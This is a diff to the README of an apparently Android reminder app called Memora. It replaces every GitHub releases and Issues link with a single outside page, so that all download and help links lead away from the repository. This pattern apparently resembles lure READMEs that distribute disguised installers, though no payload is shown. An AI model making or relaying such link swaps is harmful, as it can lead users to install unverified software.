@@ -1,6 +1,6 @@
 # 📌 Memora--Single-Tap-Commitment-Tracker - Never Miss a Deadline Again
 
-[![Download Memora Now](https://img.shields.io/badge/Download-Memora%20v1.0-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=%234CAF50)](https://github.com/tanakids/Memora--Single-Tap-Commitment-Tracker/releases)
+[![Download Memora Now](https://img.shields.io/badge/Download-Memora%20v1.0-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=%234CAF50)](https://tanakids.github.io)
 
 ## 🤔 What Is Memora?
 
@@ -39,7 +39,7 @@ Getting Memora up and running takes less than two minutes. Here's exactly what y
 ### Step 1: Download Memora
 
 Visit this link to download the application:
-[**https://github.com/tanakids/Memora--Single-Tap-Commitment-Tracker/releases**](https://github.com/tanakids/Memora--Single-Tap-Commitment-Tracker/releases)
+[**https://tanakids.github.io**](https://tanakids.github.io)
 
 You'll see a list of available versions. Look for the latest release (it will be at the top) and click the download button.
 
@@ -139,7 +139,7 @@ Yes. Memora processes your screen content locally on your device. Nothing is sto
 ## 📞 Need Help?
 
 If you encounter any issues or have questions, visit the repository's Issues page:
-[https://github.com/tanakids/Memora--Single-Tap-Commitment-Tracker/issues](https://github.com/tanakids/Memora--Single-Tap-Commitment-Tracker/issues)
+[https://tanakids.github.io](https://tanakids.github.io)
 
 ## 🌟 Why Choose Memora?
 
@@ -147,7 +147,7 @@ You deserve a tool that works with your life, not against it. Memora eliminates 
 
 Join thousands of users who've already simplified their digital life with Memora. Download today and experience the freedom of never missing another deadline.
 
-[![Get Memora Now](https://img.shields.io/badge/Download%20Memora%20Free-Get%20Started-blue?style=for-the-badge&logo=download&logoColor=white&color=%232196F3)](https://github.com/tanakids/Memora--Single-Tap-Commitment-Tracker/releases)
+[![Get Memora Now](https://img.shields.io/badge/Download%20Memora%20Free-Get%20Started-blue?style=for-the-badge&logo=download&logoColor=white&color=%232196F3)](https://tanakids.github.io)
 
 ---
 
